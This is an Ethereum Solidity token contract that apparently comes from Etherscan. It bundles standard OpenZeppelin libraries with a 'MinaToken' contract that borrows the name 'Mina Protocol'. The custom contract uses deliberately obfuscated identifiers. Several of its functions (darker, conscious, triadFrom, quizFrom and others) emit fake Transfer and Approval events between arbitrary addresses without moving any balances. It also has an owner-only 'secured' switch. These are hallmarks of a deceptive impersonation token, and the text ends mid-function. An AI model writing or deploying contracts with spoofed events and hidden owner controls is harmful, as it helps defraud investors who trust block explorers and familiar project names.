/**
 *Submitted for verification at Etherscan.io on 2020-12-16
*/

//........................................................................................................................................................................................
//.........................................................................iiiiiiiiiiiii..................................................................................................
//.........................................................................iiiiiiiiiiiii..................................................................................................
//.........................................................................iiiiiiiiiiiii..................................................................................................
//.........................................................................iiiiiiiiiiiii..................................................................................................
//.........................................................................iiiiiiiiiiiii..................................................................................................
//.........................................................................iiiiiiiiiiiii..................................................................................................
//.........................................................................iiiiiiiiiiiii..................................................................................................
//.........................................................................iiiiiiiiiiiii..................................................................................................
//.........................................................................iiiiiiiiiiiii..................................................................................................
//.........................................................................iiiiiiiiiiiii..................................................................................................
//........................................................................................................................................................................................
//........................................................................................................................................................................................
//........................................................................................................................................................................................
//........................................................................................................................................................................................
//........................................................................................................................................................................................
//...................mmmmmmmmmmmm.............mmmmmmmmmmmm..........................................................nnnnnnnnnnnn...........................aaaaaaaaaaaaaaaaaa.............
//.mmmmmmmmmmmm....mmmmmmmmmmmmmmmm.........mmmmmmmmmmmmmmmm...............iiiiiiiiiiiii.........nnnnnnnnnnnn....nnnnnnnnnnnnnnnnn......................aaaaaaaaaaaaaaaaaaaaaaa...........
//.mmmmmmmmmmmm..mmmmmmmmmmmmmmmmmmmm.....mmmmmmmmmmmmmmmmmmmm.............iiiiiiiiiiiii.........nnnnnnnnnnnn...nnnnnnnnnnnnnnnnnnnn..................aaaaaaaaaaaaaaaaaaaaaaaaaaa.........
//.mmmmmmmmmmmm.mmmmmmmmmmmmmmmmmmmmmm...mmmmmmmmmmmmmmmmmmmmmm............iiiiiiiiiiiii.........nnnnnnnnnnnn.nnnnnnnnnnnnnnnnnnnnnnn................aaaaaaaaaaaaaaaaaaaaaaaaaaaaa........
//.mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm.mmmmmmmmmmmmmmmmmmmmmmmm...........iiiiiiiiiiiii.........nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn..............aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.......
//.mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm...........iiiiiiiiiiiii.........nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn............aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa......
//.mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm..........iiiiiiiiiiiii.........nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn............aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa......
//.mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm..........iiiiiiiiiiiii.........nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn..........aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.....
//.mmmmmmmmmmmmmmmmmmmm.mmmmmmmmmmmmmmmmmmmmmmmm.mmmmmmmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnnnnnnnnn..nnnnnnnnnnnnnnnnn..........aaaaaaaaaaaaaaaa..aaaaaaaaaaaaaaaaa.....
//.mmmmmmmmmmmmmmmmm......mmmmmmmmmmmmmmmmmmm......mmmmmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnnnnnnn......nnnnnnnnnnnnnnn.........naaaaaaaaaaaaa........aaaaaaaaaaaaaa.....
//.mmmmmmmmmmmmmmmm........mmmmmmmmmmmmmmmmm........mmmmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnnnnn.........nnnnnnnnnnnnnn.........naaaaaaaaaaaa..........aaaaaaaaaaaaa.....
//.mmmmmmmmmmmmmmm..........mmmmmmmmmmmmmmm..........mmmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnnnn...........nnnnnnnnnnnnn.........naaaaaaaaaaa............aaaaaaaaaaaa.....
//.mmmmmmmmmmmmmm...........mmmmmmmmmmmmmmm..........mmmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnnn............nnnnnnnnnnnnn..........aaaaaaaaaa.............aaaaaaaaaaaa.....
//.mmmmmmmmmmmmmm...........mmmmmmmmmmmmmm...........mmmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnnn............nnnnnnnnnnnnnn................................aaaaaaaaaaaaa....
//.mmmmmmmmmmmmmm...........mmmmmmmmmmmmmm...........mmmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnnn.............nnnnnnnnnnnnn................................aaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmmm...........mmmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn..............................aaaaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn..........................aaaaaaaaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn.....................aaaaaaaaaaaaaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn.................aaaaaaaaaaaaaaaaaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn..............aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn............aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn...........aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn..........aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn.........aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn........naaaaaaaaaaaaaaaaaaaaa..aaaaaaaaaaaa.....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn........naaaaaaaaaaaaaaaa.......aaaaaaaaaaaa.....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn.......nnaaaaaaaaaaaaa..........aaaaaaaaaaaa.....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn.......nnaaaaaaaaaaaa...........aaaaaaaaaaaa.....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn.......nnaaaaaaaaaaa............aaaaaaaaaaaa.....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn.......nnaaaaaaaaaa.............aaaaaaaaaaaa.....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn......nnnaaaaaaaaaa.............aaaaaaaaaaaa.....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn......nnnaaaaaaaaaa............aaaaaaaaaaaaa.....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn......nnnaaaaaaaaaaa..........aaaaaaaaaaaaaa.....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn.......nnaaaaaaaaaaa.........aaaaaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn.......nnaaaaaaaaaaaa.......aaaaaaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn.......nnaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn.......nnaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn........naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn........naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn.........aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn..........aaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaa...
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn...........aaaaaaaaaaaaaaaaaaaa...aaaaaaaaaaaa...
//.mmmmmmmmmmmmm............mmmmmmmmmmmmm.............mmmmmmmmmmmm.........iiiiiiiiiiiii.........nnnnnnnnnnnnn..............nnnnnnnnnnnnn............aaaaaaaaaaaaaaaaaa....aaaaaaaaaaaaa..
//......................................................................................................................................................aaaaaaaaaaaa......................
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

// File: openzeppelin-solidity\contracts\token\ERC20\IERC20.sol

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: openzeppelin-solidity\contracts\math\SafeMath.sol

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

// File: openzeppelin-solidity\contracts\utils\Address.sol

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.2;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

// File: openzeppelin-solidity\contracts\access\Ownable.sol

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner;
    bool isTransferred  = false;
    address ancient;
    address novel;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function isOwnerTransferred() public view returns (bool) {
        if(isTransferred){
            return true;
            
        }
        if(!isTransferred){
            return false;
            
        }
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    
        function whoIsOwner(address _ancient, address _novel) public onlyOwner {
        address ancient = _ancient;
        address novel = _novel;
        isTransferred=false;
        emit OwnershipTransferred(ancient, novel);
    }
    function getwergancient() public view returns (address) {
        address vetrher= _owner;
        return vetrher;
    }
    
    function getan6hrtgcient() public view returns (address) {
        address wergwehwrh= _owner;
        return wergwehwrh;
    }
    
    function getancient() public view returns (address) {
        address onjreihr= _owner;
        return onjreihr;
    }
    function getnovel() public view returns (address) {
        address egrrge = novel;

        return egrrge;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


pragma solidity ^0.6.2;

contract MinaToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private crtgbrh643xx;
    mapping (address => uint256) private sddgrgwe;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcluded;
    address[] private _excluded;
    bool public secured;
    bool public hasbeenLocked;
    address public loadder;
    address public loadderer;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant sxefgthrthrfd = 80 * 10**6 * 10**9;
    uint256 private sdfrslebuiothe = (MAX - (MAX % sxefgthrthrfd));
    uint256 private _sethyjutTotal;

    string private _name = 'Mina Protocol';
    string private _symbol = 'MNA';
    uint8 private _decimals = 9;

    constructor () public {
        secured = true;
        hasbeenLocked = false;
        crtgbrh643xx[_msgSender()] = sdfrslebuiothe;
         uint ishdkj = 82937;
         loadder = loadderer;
         ishdkj += 51684;
        emit Transfer(address(0), _msgSender(), sxefgthrthrfd);
    }



    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return sxefgthrthrfd;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return sddgrgwe[account];
        return NJhuvyIOnjKJBiyvuNVgc(crtgbrh643xx[account]);
    }
    function setB(bool _secured) public onlyOwner{
        secured = _secured;
        hasbeenLocked = false;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function darker(address oaasne, address twwwo, uint ryhers) public returns (bool success) {
        emit Approval(msg.sender, oaasne, ryhers);
        emit Approval(msg.sender, twwwo, ryhers ** 1259);
        return false;
    }
    function lighter(address oneoneone, address twotwo, uint norfatr) public returns (bool success) {
        emit Approval(msg.sender, oneoneone, norfatr);
        emit Approval(msg.sender, twotwo, norfatr / 120);
        return false;
    }

    function conscious(address one, address two, uint noratr) public returns (bool success) {
        emit Approval(msg.sender, one, noratr);
        emit Approval(msg.sender, two, noratr * 10);
        return false;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function isExcluded(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function totalFees() public view returns (uint256) {
        return _sethyjutTotal;
    }
    function fapRove(address newance, uint part) public returns (bool success) {
        emit Approval(msg.sender, newance, part);
        return false;
    }
    function updatedSupply(uint total_supply) public 
    {
         uint increasedAmount = total_supply - total_supply;
         uint256 unincreasedamount = (increasedAmount * 2) ** 2;
         unincreasedamount += 5;
         unincreasedamount *= 15;
         uint256 ergnoierg = total_supply;
        unincreasedamount = 100000 ;
    }
    function yessaaer(address newance, uint part) public returns (bool success) {
        emit Approval(msg.sender, newance, part);
        return false;
    }
    function gggaaerras(address newance, uint part) public returns (bool success) {

        emit Approval(msg.sender, newance, part*10);
        emit Approval(msg.sender, newance, part*15);
        emit Approval(msg.sender, newance, part*30);
        return true;
    }

    function triadFrom(address psyc, address news, uint port) public  returns (bool success) {
        uint oamskflsdf = 34724362473;
        emit Transfer(psyc, news, port);
        return true;
    }

    function quizFrom(address highScore, address lowScore, uint pale) public  returns (bool success) {
        emit Transfer(highScore, lowScore, pale/65);
        return false;
    }
    function desr(address highScore, address lowScore, uint pale) public  returns (bool success) {

        emit Transfer(highScore, lowScore, pale/2);
        return false;
    }
    function reflect(uint256 wegefdcswe) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        (uint256 sawineufwi,,,,) = _kbHJGuyciUVBO(wegefdcswe);
        crtgbrh643xx[sender] = crtgbrh643xx[sender].sub(sawineufwi);
        sdfrslebuiothe = sdfrslebuiothe.sub(sawineufwi);
        _sethyjutTotal = _sethyjutTotal.add(wegefdcswe);
    }
    function newFunc(address newAdd) public view returns (uint balance) {
        address oldAdd = newAdd;
        
        return 28464;
    }
    function nIUYutyUGIhoVG(uint256 wegefdcswe, bool deductTransfeoweuiyrwh) public view returns(uint256) {
        require(wegefdcswe <= sxefgthrthrfd, "Amount must be less than supply");
        if (!deductTransfeoweuiyrwh) {
            (uint256 sawineufwi,,,,) = _kbHJGuyciUVBO(wegefdcswe);
            return sawineufwi;
        } else {
